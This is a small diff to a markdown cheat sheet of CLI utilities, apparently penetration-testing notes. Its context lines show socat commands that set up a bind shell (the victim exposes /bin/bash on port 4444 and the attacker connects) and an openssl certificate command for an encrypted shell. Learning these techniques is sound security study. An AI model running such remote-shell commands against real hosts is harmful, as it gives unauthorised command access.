@@ -1,5 +1,5 @@
 # Utilities 
-useful CLI utilities
+useful CLI utilities 
 
 ## File Transfers
 - netcat
@@ -35,8 +35,8 @@ Victim listens and attacker connects. Useful when bypassing firewalls or when re
 	- victim runs: `socat -d -d TCP4-LISTEN:4444 EXEC:/bin/bash`
 	- attacker runs: `socat - TCP4:{ip-address}:4444`
 
-## Encrypted shells with openssl
-utilize SSL certificates to encrypt data sent between hosts
+## Encrypted shells with OpenSSL
+Utilize SSL certificates to encrypt data sent between hosts
 
 - create an openssl certificate
 	- `openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 100 -out bind_shell.crt`
